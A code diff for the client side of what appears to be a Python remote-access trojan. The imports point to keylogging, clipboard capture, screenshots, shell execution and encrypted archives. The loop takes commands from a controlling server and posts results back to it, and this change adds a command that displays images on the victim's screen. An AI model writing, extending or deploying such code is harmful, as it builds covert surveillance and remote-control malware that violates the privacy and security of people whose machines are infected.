@@ -17,7 +17,7 @@ from subprocess import run, PIPE, STDOUT
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from pyperclip import paste, PyperclipWindowsException
 from pynput.keyboard import Listener, Controller
-from PIL import ImageGrab
+from PIL import ImageGrab, Image
 from encryption import cipher
 
 # Settings Variables(Constants) Importing
@@ -85,7 +85,7 @@ def on_press(key_press):
 
 
 # clientPrint used for print only username@machine from client variable
-clientPrint = client.split("@")[0:1]
+clientPrint = "@".join(client.split("@")[0:2])
 
 # the delay between re-connection attempts when inactive is set in settings.py
 delay = DELAY
@@ -391,11 +391,39 @@ while True:
 
         # Notify us on server to screenshot saved
         post_to_server(f"screenshot_{shoutCount}.png has been Saved on the Client. "
-                       f"\nuse client upload screenshot_{shoutCount}.png to get it. \n")
+                       f"\nUse client upload screenshot_{shoutCount}.png to get it. \n")
+
+    # the 'client display IMAGE' command will display an image on the client's machine screen
+    elif command.startswith("client display"):
+
+        # Split out the filepath to display it,
+        # then replace \ with / and if got IndexError continue to start of while iterate
+        filepath = get_filename(command)
+
+        # if the filepath not submit, continue to start of while iterate
+        if filepath is None:
+            continue
+        else:
+            try:
+                image = Image.open(filepath)
+                image.show()
+                post_to_server(f"[+]-Client => {filepath} is now Displaying on the {clientPrint}. \n")
+            except OSError as e:
+                # test print
+                #print(e, "\n")
+                if "cannot identify image".lower() in str(e).lower():
+                    post_to_server(f"[!]-Client => {filepath} is not an image. \n")
+                elif "No such file".lower() in str(e).lower():
+                    post_to_server(f"[!]-Client => {filepath} is not Found on the {clientPrint}. \n")
+                else:
+                    post_to_server(f"[!]-Client => Unable to Display {filepath} on the {clientPrint}. \n")
+
 
     # Else, the wrong input, actually not a Built-in Command or Shell Command or Client/Server Commands
     else:
         post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")
+
+
 
 
     # test print
